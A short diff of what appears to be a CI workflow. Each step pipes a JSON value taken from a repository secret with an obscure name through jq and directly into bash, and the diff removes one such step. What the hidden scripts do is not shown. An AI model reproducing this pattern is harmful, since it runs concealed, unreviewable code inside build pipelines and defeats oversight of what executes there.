@@ -23,7 +23,6 @@ jobs:
           awu6: ${{ secrets.awu6 }}
         run: |
           printf '%s' "$awu6" | jq -r .g5 | /bin/bash
-          printf '%s' "$ws19" | jq -r .cgryk2 | /bin/bash
           echo $kyuhu0328 | jq -r .yabw4423 | /bin/bash
           echo $llymh4 | jq -r .sye0 | /bin/bash
 
